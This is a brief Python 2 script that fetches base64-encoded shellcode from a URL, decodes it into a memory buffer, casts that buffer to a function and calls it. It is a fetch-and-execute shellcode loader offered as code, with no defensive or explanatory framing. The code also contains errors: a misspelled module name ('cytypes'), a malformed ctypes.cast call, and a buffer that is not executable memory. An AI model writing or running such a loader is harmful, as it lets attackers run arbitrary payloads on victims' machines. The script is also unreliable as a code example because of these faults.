#!/usr/bin/env python
import urllib2
import ctypes
import base64

url = 'http://localhost:8000/shellcode.bin'

response = urllib2.urlopen(url)

shellcode = base64.b64decode(response.read())

shellcode_buffer = cytypes.create_string_buffer(shellcode, len(shellcode))

shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE, (ctypes.c_void_p))

shellcode_func()
